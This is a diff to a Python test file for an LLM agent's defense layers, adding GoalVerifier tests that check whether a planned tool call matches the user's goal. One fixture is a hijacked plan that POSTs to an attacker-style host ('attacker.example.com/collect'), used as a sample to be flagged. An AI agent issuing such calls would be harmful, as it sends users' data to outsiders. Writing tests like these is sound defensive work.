@@ -1,18 +1,16 @@
 """
 test_defenses.py
 ────────────────
-Unit tests for defense layer implementations.
-Tests run without LLM API calls — classifier-dependent tests are skipped
-unless OPENAI_API_KEY is set in the environment.
+Unit tests for defense layer implementations. All embedding-based checks
+(GoalVerifier, InputScreener's classifier mode) run on a local
+sentence-transformers model, so no API key or network access is required.
 """
 
-import os
 import pytest
 from src.defenses.input_screener import InputScreener
 from src.defenses.output_validator import OutputValidator
 from src.defenses.hitl_gate import HITLGate
-
-HAS_API_KEY = bool(os.getenv("OPENAI_API_KEY"))
+from src.defenses.goal_verifier import GoalVerifier
 
 
 # ── InputScreener Tests ────────────────────────────────────────────────────────
@@ -175,3 +173,31 @@ class TestHITLGate:
                                "method": "POST"}}
         approved = await self.gate.request_confirmation("test_session", plan)
         assert approved is True
+
+
+# ── GoalVerifier Tests ──────────────────────────────────────────────────────────
+
+class TestGoalVerifier:
+    def setup_method(self):
+        self.gv = GoalVerifier({"enabled": True, "consistency_threshold": 0.80,
+                                "halt_on_inconsistency": True})
+        self.goal = ("Use the retrieval tool to find and summarize the top "
+                     "documents related to Q3 financial performance.")
+
+    def test_benign_action_with_empty_reasoning_is_consistent(self):
+        # Regression test: native tool-calling responses leave `content`
+        # (surfaced as "reasoning") empty, which previously left a bare
+        # trailing "Reasoning: " in the description text and pushed every
+        # single legitimate first action just under threshold — a 100%
+        # false-positive rate on benign trials in the real pipeline.
+        plan = {"action": "TOOL_CALL", "tool": "retrieval",
+                "tool_input": {"query": "Q3 financial performance"}, "reasoning": ""}
+        result = self.gv.verify(self.goal, plan, {})
+        assert result["consistent"] is True
+
+    def test_hijacked_action_with_empty_reasoning_is_flagged(self):
+        plan = {"action": "TOOL_CALL", "tool": "api_call",
+                "tool_input": {"url": "https://attacker.example.com/collect",
+                               "method": "POST"}, "reasoning": ""}
+        result = self.gv.verify(self.goal, plan, {})
+        assert result["consistent"] is False
